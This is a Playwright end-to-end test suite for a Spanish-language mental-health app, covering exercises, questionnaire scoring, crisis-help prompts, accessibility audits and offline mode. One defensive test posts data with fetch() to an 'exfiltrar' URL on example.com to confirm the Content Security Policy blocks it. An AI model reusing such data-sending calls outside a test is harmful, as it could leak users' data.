import { expect, test, type Page } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';
import { readFileSync } from 'node:fs';

/** Cada test empieza con almacenamiento limpio (usuario demo nuevo) y sin animaciones. */
test.use({ reducedMotion: 'reduce' });

async function open(page: Page, path: string) {
  await page.goto(path);
  await page.evaluate(() => localStorage.clear());
  await page.goto(path);
}

test('un usuario nuevo ve la bienvenida en el panel', async ({ page }) => {
  await open(page, '/dashboard');
  await expect(page.getByText('Bienvenida')).toBeVisible();
  await expect(page.getByRole('link', { name: /Medir mi bienestar/ })).toBeVisible();
  // Fecha en español: sólo la primera letra en mayúscula ("Lunes, 12 de octubre").
  const date = await page.locator('main header p').first().innerText();
  expect(date).toMatch(/^[A-ZÁÉÍÓÚ][a-záéíóú]+, \d{1,2} de [a-z]+$/);
});

test('antídoto completo: reconocer → medir → practicar → volver a medir', async ({ page }) => {
  await open(page, '/antidotos');
  await page.getByRole('button', { name: /^Ira/ }).click();
  await page.getByRole('radio', { name: '7' }).click();
  await page.getByRole('button', { name: 'Continuar' }).click();

  await page.getByRole('button', { name: 'Comenzar', exact: true }).click();
  // Avanza paso a paso hasta la reevaluación. Tras el último paso el botón sale con una
  // animación: el clic puede fallar mientras desaparece, por eso se reintenta con timeout corto.
  const reassess = page.getByRole('heading', { name: '¿Cómo está ahora?' });
  for (let i = 0; i < 12 && !(await reassess.isVisible()); i++) {
    await page.getByRole('button', { name: 'Siguiente paso' }).click({ timeout: 3_000 }).catch(() => undefined);
  }
  await expect(reassess).toBeVisible();
  await page.getByRole('radio', { name: '4' }).click();
  await page.getByRole('button', { name: 'Guardar registro' }).click();

  await expect(page.getByText('Registro guardado')).toBeVisible();
  await page.getByRole('button', { name: 'Registrar otra emoción' }).click();
  await expect(page.getByText('Tu historial · últimos 90 días')).toBeVisible();
});

test('el cribado de riesgo detiene el ejercicio y muestra ayuda', async ({ page }) => {
  await open(page, '/antidotos');
  await page.getByRole('button', { name: /^Ansiedad/ }).click();
  await page.getByRole('radio', { name: '9' }).click();
  await expect(page.getByText(/90 segundos de\s+respiración lenta/)).toBeVisible();
  await page.getByLabel(/pensamientos de hacerme daño/).check();
  await page.getByRole('button', { name: 'Continuar' }).click();
  // Next.js añade su propio role="alert" (anunciador de rutas): se filtra por contenido.
  await expect(page.getByRole('alert').filter({ hasText: 'Gracias por decirlo' })).toBeVisible();
});

test('diario: una entrada guardada aparece en la línea de tiempo', async ({ page }) => {
  await open(page, '/diario?nuevo=tres-cosas');
  const inputs = page.locator('input[type="text"]');
  for (let i = 0; i < 6; i++) await inputs.nth(i).fill(`Respuesta ${i + 1}`);
  await page.getByRole('button', { name: 'Guardar entrada' }).click();
  await expect(page.getByText('Entrada guardada')).toBeVisible();
  await page.getByRole('button', { name: 'Volver al diario' }).click();
  await expect(page.getByText('Respuesta 1').first()).toBeVisible();
});

test('WHO-5: cinco respuestas producen la puntuación correcta', async ({ page }) => {
  await open(page, '/evaluaciones');
  await page.getByRole('button', { name: /Responder ahora: Índice de Bienestar WHO-5/ }).click();
  const groups = page.getByRole('radiogroup');
  for (let i = 0; i < 5; i++) await groups.nth(i).getByRole('radio', { name: 'Más de la mitad del tiempo' }).click();
  await page.getByRole('button', { name: 'Ver resultado' }).click();
  await expect(page.getByText('60', { exact: true })).toBeVisible();
  await expect(page.getByText('Bienestar en rango habitual')).toBeVisible();
});

test('ajustes: la exportación descarga un JSON con los datos', async ({ page }) => {
  await open(page, '/ajustes');
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Descargar', exact: true }).click()]);
  // Fecha LOCAL del navegador en el nombre (antes salía la de UTC: a las 23:00 ponía el día siguiente).
  const localDate = await page.evaluate(() => {
    const d = new Date();
    return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
  });
  expect(download.suggestedFilename()).toBe(`eudaimonia-datos-${localDate}.json`);
  // Mismo formato que la exportación de Firestore, con metadatos.
  const data = JSON.parse(readFileSync((await download.path())!, 'utf8'));
  expect(data).toMatchObject({ app: 'Habilidades Psicológicas', formatVersion: 1 });
  expect(Object.keys(data)).toEqual(expect.arrayContaining(['sessions', 'checkins', 'afflictionLogs', 'journal', 'assessments', 'timezone']));
  expect(data).not.toHaveProperty('afflictions');
});

test('duración ajustable: la versión breve acorta la práctica', async ({ page }) => {
  await open(page, '/gimnasio/amor-altruista');
  const breve = page.getByRole('radio', { name: /^Breve/ });
  await breve.click();
  await expect(breve).toHaveAttribute('aria-checked', 'true');
  await expect(page.getByText(/· 5 min ·/)).toBeVisible();
});

test('temporizador libre: una sesión completa queda registrada', async ({ page }) => {
  await open(page, '/gimnasio/temporizador');
  await page.getByRole('radio', { name: '5 min', exact: true }).click();
  await page.getByRole('radio', { name: 'Sin intervalos' }).click();
  await page.getByRole('button', { name: 'Preparado' }).click();
  await page.getByRole('button', { name: 'Comenzar', exact: true }).click();
  const done = page.getByText('Práctica registrada');
  for (let i = 0; i < 6 && !(await done.isVisible()); i++) {
    await page.getByRole('button', { name: 'Siguiente paso' }).click({ timeout: 3_000 }).catch(() => undefined);
  }
  await expect(done).toBeVisible();
});

test('informe: refleja las evaluaciones y oculta el diario por defecto', async ({ page }) => {
  await open(page, '/evaluaciones');
  await page.getByRole('button', { name: /Responder ahora: Índice de Bienestar WHO-5/ }).click();
  const groups = page.getByRole('radiogroup');
  for (let i = 0; i < 5; i++) await groups.nth(i).getByRole('radio', { name: 'Más de la mitad del tiempo' }).click();
  await page.getByRole('button', { name: 'Ver resultado' }).click();
  await expect(page.getByText('Bienestar en rango habitual')).toBeVisible();

  await page.goto('/informe');
  const report = page.getByRole('article', { name: 'Vista previa del informe' });
  await expect(report.getByRole('cell', { name: '60' })).toBeVisible();
  await expect(report.getByText('Entradas del diario seleccionadas')).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Imprimir o guardar PDF' })).toBeVisible();
});

test('página 404 con el diseño de la app', async ({ page }) => {
  const res = await page.goto('/esta-ruta-no-existe');
  expect(res?.status()).toBe(404);
  await expect(page.getByRole('heading', { name: 'Esta página no existe' })).toBeVisible();
});

test('teclado: el primer Tab ofrece saltar al contenido', async ({ page, isMobile }) => {
  test.skip(isMobile, 'Navegación por teclado: sólo escritorio');
  await open(page, '/dashboard');
  await page.keyboard.press('Tab');
  await expect(page.getByRole('link', { name: 'Saltar al contenido' })).toBeFocused();
});

test('teclado: el foco no escapa de una hoja modal abierta', async ({ page, isMobile }) => {
  test.skip(isMobile, 'Navegación por teclado: sólo escritorio');
  await open(page, '/ajustes');
  await page.getByRole('button', { name: 'Eliminar…' }).click();
  const dialog = page.getByRole('dialog', { name: 'Eliminar la cuenta' });
  await expect(dialog).toBeVisible();
  for (let i = 0; i < 8; i++) {
    await page.keyboard.press('Tab');
    expect(await dialog.evaluate((el) => el.contains(document.activeElement))).toBe(true);
  }
  await page.keyboard.press('Escape');
  await expect(dialog).toBeHidden();
});

test('buscador: Ctrl+K, escribir sin tildes y abrir el resultado con Enter', async ({ page, isMobile }) => {
  test.skip(isMobile, 'Atajo de teclado: sólo escritorio');
  await open(page, '/dashboard');
  // El atajo se registra al hidratar: esperar a que el panel termine de cargar.
  await page.waitForLoadState('networkidle');
  await expect(page.getByRole('heading', { level: 1, name: 'Panel' })).toBeVisible();
  await page.keyboard.press('Control+k');
  const input = page.getByRole('combobox', { name: /Buscar/ });
  await expect(input).toBeFocused();
  // Sin tildes: el primer resultado es el antídoto (lo más útil si estás rumiando ahora).
  await input.fill('rumiacion');
  await expect(page.getByRole('option').first()).toContainText('Rumiación');
  await expect(page.getByRole('option').first()).toContainText('Defusión');
  // Varias palabras (AND): sólo el artículo contiene ambas.
  await input.fill('rumiacion pensar');
  await expect(page.getByRole('option')).toHaveCount(1);
  await page.keyboard.press('Enter');
  await expect(page).toHaveURL(/\/biblioteca\/rumiacion$/);
  await expect(page.getByRole('heading', { level: 1 })).toContainText('Rumiación');
});

test('buscador: botón de la cabecera y enlace profundo a un antídoto', async ({ page }) => {
  await open(page, '/gimnasio');
  await page.getByRole('button', { name: /Buscar/ }).click();
  await page.getByRole('combobox', { name: /Buscar/ }).fill('envidia');
  await page.getByRole('option').filter({ hasText: 'Envidia' }).first().click();
  await expect(page).toHaveURL(/\/antidotos\?emocion=envidia$/);
  await expect(page.getByRole('heading', { name: 'Envidia', exact: true })).toBeVisible();
});

test('accesibilidad WCAG 2.1 AA: buscador abierto', async ({ page }) => {
  await open(page, '/dashboard');
  await page.getByRole('button', { name: /Buscar/ }).click();
  await page.getByRole('combobox', { name: /Buscar/ }).fill('respiracion');
  await page.waitForTimeout(800);
  const results = await new AxeBuilder({ page }).include('[role="dialog"]').withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
  expect(results.violations.map((v) => `${v.id}: ${v.nodes[0]?.target.join(' ')}`)).toEqual([]);
});

test('diario: registro de pensamientos (TCC) con intensidad antes y después', async ({ page }) => {
  await open(page, '/diario?nuevo=reestructuracion');
  await page.getByLabel('Situación').fill('Reunión con mi jefa');
  await page.getByLabel(/Emoción, con el nombre/).fill('vergüenza');
  await page.getByRole('radiogroup', { name: 'Intensidad de la emoción', exact: true }).getByRole('radio', { name: '8' }).click();
  await page.getByLabel('Pensamiento automático').fill('Piensa que soy incompetente');
  await page.getByLabel(/Datos que apoyan/).fill('No sonrió');
  await page.getByLabel(/Datos que no encajan/).fill('Me felicitó la semana pasada');
  await page.getByLabel(/Pensamiento alternativo/).fill('Quizá estaba preocupada por otra cosa');
  await page.getByRole('radiogroup', { name: 'Intensidad de la emoción ahora' }).getByRole('radio', { name: '4' }).click();
  await page.getByRole('button', { name: 'Guardar entrada' }).click();
  await expect(page.getByText('Entrada guardada')).toBeVisible();
  await page.getByRole('button', { name: 'Volver al diario' }).click();
  await expect(page.getByText('Piensa que soy incompetente').first()).toBeVisible();
});

test('antídoto nuevo: soledad, desde el buscador hasta el registro', async ({ page }) => {
  await open(page, '/antidotos?emocion=soledad');
  await expect(page.getByRole('heading', { name: 'Soledad' })).toBeVisible();
  await page.getByRole('radio', { name: '6' }).click();
  await page.getByRole('button', { name: 'Continuar' }).click();
  await expect(page.getByRole('heading', { name: 'Reconexión' })).toBeVisible();
  await expect(page.getByRole('tab', { name: 'Por qué funciona' })).toBeVisible();
});

test('gimnasio: herramientas rápidas de 1–3 minutos sin selector de duración', async ({ page }) => {
  await open(page, '/gimnasio');
  const quick = page.getByRole('region', { name: /Herramientas rápidas/ });
  await expect(quick.getByRole('link')).toHaveCount(7);
  await quick.getByRole('link', { name: /Pausa STOP/ }).click();
  await expect(page.getByRole('heading', { level: 1, name: 'Pausa STOP' })).toBeVisible();
  await expect(page.getByRole('radiogroup', { name: 'Duración' })).toHaveCount(0);
});

test('niveles: una práctica avanzada recomienda sus prerrequisitos', async ({ page }) => {
  await open(page, '/gimnasio/tonglen');
  await expect(page.getByText(/Práctica de nivel avanzado/)).toBeVisible();
  // Aparece como prerrequisito y como alternativa más segura (nivel de riesgo 2).
  await expect(page.getByRole('link', { name: 'Meditación de amor altruista' }).first()).toBeVisible();
});

test('GAD-7: siete respuestas producen la puntuación y su interpretación', async ({ page }) => {
  await open(page, '/evaluaciones');
  await page.getByRole('button', { name: /Responder ahora: Cuestionario de ansiedad GAD-7/ }).click();
  const groups = page.getByRole('radiogroup');
  await expect(groups).toHaveCount(7);
  for (let i = 0; i < 7; i++) await groups.nth(i).getByRole('radio', { name: 'Más de la mitad de los días' }).click();
  await page.getByRole('button', { name: 'Ver resultado' }).click();
  await expect(page.getByText('14', { exact: true })).toBeVisible();
  await expect(page.getByText('Ansiedad moderada')).toBeVisible();
});

test('PHQ-9 (borrador): el ítem de riesgo muestra la ayuda antes que la puntuación', async ({ page }) => {
  await open(page, '/evaluaciones');
  await expect(page.getByText('Borrador · requiere revisión clínica').first()).toBeVisible();
  await page.getByRole('button', { name: /Responder ahora: Cuestionario de salud del paciente PHQ-9/ }).click();
  const groups = page.getByRole('radiogroup');
  for (let i = 0; i < 8; i++) await groups.nth(i).getByRole('radio', { name: 'Nunca' }).click();
  await groups.nth(8).getByRole('radio', { name: 'Varios días' }).click();
  await page.getByRole('button', { name: 'Ver resultado' }).click();
  const alert = page.getByRole('alert').filter({ hasText: 'Gracias por responder con sinceridad' });
  await expect(alert).toBeVisible();
  // La ayuda aparece antes (más arriba) que la puntuación.
  const alertBox = await alert.boundingBox();
  const scoreBox = await page.getByText(/Tu puntuación/).boundingBox();
  expect(alertBox!.y).toBeLessThan(scoreBox!.y);
});

test('plan de seguridad (borrador): se guarda como versión y se recupera', async ({ page }) => {
  await open(page, '/plan-de-seguridad');
  await expect(page.getByText('Borrador · requiere revisión clínica')).toBeVisible();
  await page.getByLabel(/Mis señales de alerta/).fill('No dormir, aislarme');
  await page.getByLabel(/Personas a quienes puedo pedir ayuda/).fill('Ana 600 000 000');
  await page.getByRole('button', { name: 'Guardar plan' }).click();
  await expect(page.getByText('Guardado')).toBeVisible();
  await page.reload();
  await expect(page.getByLabel(/Mis señales de alerta/)).toHaveValue('No dormir, aislarme');
});

test('biblioteca: glosario, diagrama del ciclo y lectura en voz alta', async ({ page }) => {
  await open(page, '/biblioteca');
  await page.getByRole('link', { name: /Glosario/ }).click();
  await expect(page.getByRole('heading', { level: 1, name: 'Glosario' })).toBeVisible();
  await expect(page.getByText('Defusión cognitiva', { exact: true })).toBeVisible();
  await page.goto('/biblioteca/activacion-conductual');
  await expect(page.getByRole('img', { name: /El círculo del desánimo/ })).toBeVisible();
  await expect(page.getByRole('button', { name: 'Escuchar' })).toBeVisible();
});

test('kit de crisis: a intensidad 9 el antídoto sugiere TIPP, con sus contraindicaciones', async ({ page }) => {
  await open(page, '/antidotos?emocion=ira');
  await page.getByRole('radio', { name: '9' }).click();
  await page.getByRole('link', { name: /Prueba primero el kit de crisis/ }).click();
  await expect(page.getByRole('heading', { level: 1, name: 'TIPP: kit de crisis' })).toBeVisible();
  await expect(page.getByText(/No uses el agua fría si tienes problemas cardíacos/)).toBeVisible();
});

test('antídoto de pánico: psicoeducación primero y aviso médico', async ({ page }) => {
  await open(page, '/antidotos?emocion=panico');
  await expect(page.getByRole('heading', { name: 'Ataque de pánico' })).toBeVisible();
  await page.getByRole('radio', { name: '7' }).click();
  await page.getByRole('button', { name: 'Continuar' }).click();
  await expect(page.getByText(/no es peligroso/).first()).toBeVisible();
  await page.getByRole('tab', { name: 'Cuándo no usarlo' }).click();
  await expect(page.getByText(/Ve a urgencias si tienes dolor en el pecho/)).toBeVisible();
});

test('trampas del pensamiento: catálogo enlazado desde el registro de pensamientos', async ({ page }) => {
  await open(page, '/diario?nuevo=reestructuracion');
  await page.getByRole('link', { name: /Ver las 12 trampas del pensamiento/ }).click();
  await expect(page.getByRole('heading', { level: 1, name: 'Trampas del pensamiento' })).toBeVisible();
  await page.getByText('Catastrofizar', { exact: true }).click();
  await expect(page.getByText(/Qué es lo más probable que pase/)).toBeVisible();
});

test('diario: preparar una conversación difícil (DEAR MAN)', async ({ page }) => {
  await open(page, '/diario?nuevo=conversacion');
  await page.getByLabel('Con quién').fill('Mi jefa');
  await page.getByLabel(/Los hechos/).fill('Tres días de horas extra');
  await page.getByLabel(/Cómo me afecta/).fill('Estoy agotado');
  await page.getByLabel(/Lo que pido/).fill('Salir a mi hora tres días');
  await page.getByRole('button', { name: 'Guardar entrada' }).click();
  await expect(page.getByText('Entrada guardada')).toBeVisible();
});

test('ayuda: el botón está en todas las pantallas y llama a las líneas de crisis', async ({ page }) => {
  for (const path of ['/dashboard', '/gimnasio', '/laboratorio']) {
    await open(page, path);
    await page.getByRole('button', { name: 'Ayuda' }).click();
    await expect(page.getByRole('link', { name: /Llamar a Línea Nacional de Salud Mental/ })).toHaveAttribute('href', 'tel:08009990091');
    await page.keyboard.press('Escape');
  }
});

test('nivel de riesgo 2: hay que leer las precauciones antes de empezar', async ({ page }) => {
  await open(page, '/gimnasio/aceptacion-radical');
  const start = page.getByRole('button', { name: 'Preparado' });
  await expect(start).toBeDisabled();
  await page.getByLabel(/Leí las precauciones/).check();
  await expect(start).toBeEnabled();
});

test('laboratorio: el simulador explica una respuesta pasiva y deja probar otra', async ({ page }) => {
  await open(page, '/laboratorio/conversaciones/decir-no-trabajo');
  await page.getByRole('radio', { name: /no hay problema/ }).click();
  await expect(page.getByText('Respuesta pasiva')).toBeVisible();
  await page.getByRole('button', { name: 'Probar otra respuesta' }).click();
  await page.getByRole('radio', { name: /Hoy tengo un compromiso/ }).click();
  await expect(page.getByText('Respuesta asertiva')).toBeVisible();
  await page.getByRole('button', { name: 'Seguir la conversación' }).click();
  await expect(page.getByText(/es urgente/).first()).toBeVisible();
});

test('laboratorio: la caja de herramientas aparece en el semáforo en rojo', async ({ page }) => {
  await open(page, '/laboratorio/caja');
  await page.getByPlaceholder(/No puedo pensar/).fill('Me tiemblan las manos');
  await page.getByRole('button', { name: 'Guardar mi caja' }).click();
  await expect(page.getByText('Guardada.')).toBeVisible();
  await page.goto('/laboratorio/semaforo');
  await page.getByRole('radio', { name: '9' }).click();
  await expect(page.getByText('Me tiemblan las manos')).toBeVisible();
  await expect(page.getByRole('link', { name: /Llamar a Emergencias/ })).toBeVisible();
});

test('llevarlo a tu vida: el plan se guarda con la práctica', async ({ page }) => {
  await open(page, '/gimnasio/pausa-stop');
  await page.getByRole('button', { name: 'Preparado' }).click();
  await page.getByRole('button', { name: 'Comenzar', exact: true }).click();
  await page.getByRole('button', { name: 'Pausar', exact: true }).click();
  await page.getByRole('button', { name: 'Terminar aquí' }).click();
  await page.getByPlaceholder(/Mañana, antes de la reunión/).fill('Antes de contestar mensajes');
  await page.getByRole('button', { name: 'Registrar práctica' }).click();
  await expect(page.getByText(/Te propusiste: «Antes de contestar mensajes»/)).toBeVisible();
});

test('favoritas: se marcan desde el catálogo y aparecen arriba', async ({ page }) => {
  await open(page, '/gimnasio');
  await page.getByRole('button', { name: /Guardar «Mente sabia» en favoritas/ }).click();
  await expect(page.getByRole('heading', { name: 'Tus favoritas' })).toBeVisible();
});

for (const path of ['/', '/dashboard', '/gimnasio', '/gimnasio/espacio-tres-minutos', '/gimnasio/amor-altruista', '/gimnasio/relajacion-progresiva', '/biblioteca/glosario', '/biblioteca/estres-y-agotamiento', '/plan-de-seguridad', '/biblioteca/trampas-del-pensamiento', '/biblioteca/ataques-de-panico', '/gimnasio/tipp', '/gimnasio/temporizador', '/antidotos', '/diario', '/evaluaciones', '/informe', '/biblioteca/rumiacion', '/biblioteca/autocompasion', '/programas/fundamentos', '/programas/desanimo', '/cartas', '/ajustes', '/crecimiento', '/laboratorio', '/laboratorio/semaforo', '/laboratorio/caja', '/laboratorio/conversaciones/decir-no-trabajo', '/laboratorio/hecho-o-interpretacion', '/biblioteca/rueda-de-emociones', '/biblioteca/autoconocimiento', '/gimnasio/aceptacion-radical']) {
  test(`accesibilidad WCAG 2.1 AA: ${path}`, async ({ page }) => {
    await open(page, path);
    await page.waitForLoadState('networkidle');
    // Las entradas escalonadas animan la opacidad: auditar a mitad del fundido daría falsos
    // positivos de contraste. Se espera a que no quede ninguna animación en curso.
    await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== 'running'), null, { timeout: 5_000 }).catch(() => undefined);
    await page.waitForTimeout(1_500);
    const results = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
    const summary = results.violations.map((v) => `${v.id} (${v.nodes.length}): ${v.nodes[0]?.target.join(' ')}`);
    expect(summary).toEqual([]);
  });
}

test.describe('modo oscuro', () => {
  test.use({ colorScheme: 'dark' });

  for (const path of ['/', '/dashboard', '/gimnasio/amor-altruista', '/antidotos', '/diario', '/evaluaciones', '/informe', '/biblioteca/rumiacion', '/programas/fundamentos', '/cartas', '/ajustes']) {
    test(`accesibilidad WCAG 2.1 AA en oscuro: ${path}`, async ({ page }) => {
      await open(page, path);
      await page.waitForLoadState('networkidle');
      await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== 'running'), null, { timeout: 5_000 }).catch(() => undefined);
      await page.waitForTimeout(1_500);
      // El tema del sistema se aplica de verdad: fondo oscuro.
      const bg = await page.evaluate(() => getComputedStyle(document.documentElement).backgroundColor);
      expect(bg).toBe('rgb(22, 20, 18)');
      const results = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
      expect(results.violations.map((v) => `${v.id} (${v.nodes.length}): ${v.nodes[0]?.target.join(' ')}`)).toEqual([]);
    });
  }

  test('el informe se imprime en claro aunque la pantalla esté en oscuro', async ({ page }) => {
    await open(page, '/informe');
    await page.emulateMedia({ media: 'print', colorScheme: 'dark' });
    // El cambio de medio se aplica en el siguiente recálculo de estilos: se espera a que llegue.
    await expect
      .poll(() => page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--stone-50').trim()))
      .toBe('250 250 249');
    await expect.poll(() => page.evaluate(() => getComputedStyle(document.documentElement).backgroundColor)).toBe('rgb(255, 255, 255)'); // blanco puro en impresión (regla @media print de globals.css)
  });
});

test('ajustes: la apariencia elegida se aplica y persiste al recargar', async ({ page }) => {
  await open(page, '/ajustes');
  await page.getByRole('radio', { name: 'Oscuro' }).click();
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
  await page.reload();
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
  await page.getByRole('radio', { name: 'Sistema', exact: true }).click();
  await expect(page.locator('html')).not.toHaveAttribute('data-theme', /.+/);
});

test('seguridad: política CSP activa y sin violaciones en el uso normal', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', (msg) => {
    if (/Content Security Policy|Refused to (load|execute|connect|frame|apply)/i.test(msg.text())) violations.push(msg.text());
  });
  const res = await page.goto('/dashboard');
  const csp = res!.headers()['content-security-policy'] ?? '';
  expect(csp).toContain("connect-src 'self'");
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).toContain("object-src 'none'");
  for (const path of ['/gimnasio/amor-altruista', '/antidotos', '/diario', '/cartas', '/informe', '/ajustes', '/evaluaciones']) {
    await page.goto(path);
    await page.waitForLoadState('networkidle');
  }
  expect(violations).toEqual([]);
});

test('seguridad: la CSP bloquea enviar datos a un dominio no autorizado', async ({ page }) => {
  await page.goto('/dashboard');
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/exfiltrar', { method: 'POST', body: 'datos' });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});

test('sin conexión: la app abre las secciones clave y avisa del estado', async ({ page, context }) => {
  await open(page, '/dashboard');
  // Esperar a que el service worker se instale (precarga incluida) y controle la página.
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => undefined));
  await page.reload();
  await page.waitForFunction(() => !!navigator.serviceWorker.controller);

  await context.setOffline(true);
  try {
    // Precargada aunque nunca se visitó:
    await page.goto('/gimnasio/temporizador');
    await expect(page.getByRole('heading', { name: 'Temporizador libre' })).toBeVisible();
    await expect(page.getByText(/Sin conexión\. Puedes seguir practicando/)).toBeVisible();
    // Una página no precargada nunca muestra el error del navegador: o la sirve la caché
    // (con el aviso de estado de la app) o el aviso propio del service worker. Según la
    // versión de Chromium, la emulación sin red puede no aplicarse a las peticiones del SW.
    await page.goto('/biblioteca/rumiacion');
    await expect(page.getByRole('heading', { name: 'Sin conexión' }).or(page.getByText(/Sin conexión\. Puedes seguir practicando/))).toBeVisible();
  } finally {
    await context.setOffline(false);
  }
});
